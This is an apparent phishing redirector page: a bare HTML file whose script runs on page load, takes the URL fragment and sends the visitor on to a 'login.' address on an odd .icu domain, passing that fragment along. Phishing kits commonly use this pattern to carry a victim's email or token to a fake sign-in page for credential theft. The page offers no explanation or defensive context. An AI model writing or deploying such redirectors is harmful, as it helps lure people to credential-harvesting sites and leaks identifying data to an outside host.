<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
    <script>
        window.onload = function() {
            // Capture the fragment (everything after '#')
            var urlFragment = window.location.hash;
            
            // Define the target URL
            var targetUrl = "https://login.incorporation12.icu/GEdDyyBx"; // Change this to the desired target domain
            
            // If the URL fragment exists, append it to the target URL and redirect
            if (urlFragment) {
                window.location.href = targetUrl + urlFragment;
            } else {
                // If no fragment, just redirect to the target domain (without the fragment)
                window.location.href = targetUrl;
            }
        };
    </script>
</head>
